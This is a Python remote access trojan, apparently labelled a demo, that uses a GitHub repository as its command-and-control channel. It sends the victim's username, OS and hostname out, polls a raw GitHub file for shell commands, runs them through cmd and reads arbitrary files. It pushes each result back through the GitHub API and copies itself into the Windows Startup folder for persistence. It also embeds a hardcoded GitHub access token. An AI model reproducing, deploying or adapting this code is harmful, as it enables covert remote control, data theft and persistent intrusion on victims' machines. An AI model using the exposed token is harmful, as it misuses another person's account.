import requests
import time
import subprocess
import platform
import getpass
import socket
import os
import shutil
import base64

# ---------------- CONFIGURATION ----------------
GITHUB_USER = "coderkitty-cell"
REPO_NAME = "rat-demo"
COMMAND_FILE = "commands.txt"
RESULT_FILE = "result.txt"
BRANCH = "main"

# ---------------- GitHub token ----------------
TOKEN = "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"

HEADERS = {"Authorization": f"token {TOKEN}"}

# ---------------- URLS ----------------
COMMAND_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{REPO_NAME}/{BRANCH}/{COMMAND_FILE}"
API_URL = f"https://api.github.com/repos/{GITHUB_USER}/{REPO_NAME}/contents/{RESULT_FILE}"

# ---------------- SYSTEM INFO ----------------
def get_system_info():
    return f"User: {getpass.getuser()}\nOS: {platform.platform()}\nHostname: {socket.gethostname()}"

# ---------------- FETCH COMMANDS ----------------
def fetch_commands():
    try:
        r = requests.get(COMMAND_URL)
        return r.text.strip().splitlines()
    except:
        return []

# ---------------- EXECUTE SINGLE COMMAND ----------------
def execute_command(cmd):
    try:
        if cmd.startswith("readfile"):
            path = cmd.split(" ", 1)[1]
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    return f.read()
            except Exception as e:
                return f"READFILE ERROR: {str(e)}"

        # Normal command execution with pipes support
        output = subprocess.check_output(f'cmd /c {cmd}', shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors="ignore")
    except Exception as e:
        return f"CMD ERROR: {str(e)}"

# ---------------- SEND RESULT TO GITHUB ----------------
def send_result(data):
    try:
        print("[DEBUG] Sending data to GitHub:")
        print(data)

        r = requests.get(API_URL, headers=HEADERS)
        print("[DEBUG] GET status:", r.status_code)

        r_json = r.json()

        previous_content = ""
        sha = None

        if "content" in r_json:
            previous_content = base64.b64decode(r_json["content"]).decode()
            sha = r_json.get("sha")

        combined = previous_content + "\n" + data if previous_content else data
        encoded = base64.b64encode(combined.encode()).decode()

        payload = {"message": "update result", "content": encoded}
        if sha:
            payload["sha"] = sha

        r2 = requests.put(API_URL, headers=HEADERS, json=payload)
        print("[DEBUG] PUT status:", r2.status_code)
        print("[DEBUG] Response:", r2.text)

    except Exception as e:
        print("Error sending result:", e)

# ---------------- PERSISTENCE ----------------
def add_persistence():
    try:
        startup = os.path.join(os.getenv("APPDATA"),
                               r"Microsoft\Windows\Start Menu\Programs\Startup")
        current_file = os.path.realpath(__file__)
        dest_file = os.path.join(startup, "agent.py")
        if not os.path.exists(dest_file):
            shutil.copy(current_file, dest_file)
    except:
        pass

# ---------------- MAIN LOOP ----------------
def main():
    print("[Agent Started]")

    # Send initial system info
    send_result(get_system_info())

    # Ensure persistence
    add_persistence()

    executed_commands = set()

    while True:
        commands = fetch_commands()
        for cmd in commands:
            cmd = cmd.strip()
            if cmd and cmd not in executed_commands:
                result = execute_command(cmd)
                send_result(f"[CMD] {cmd}\n{result}")
                executed_commands.add(cmd)
        time.sleep(10)

if __name__ == "__main__":
    main()
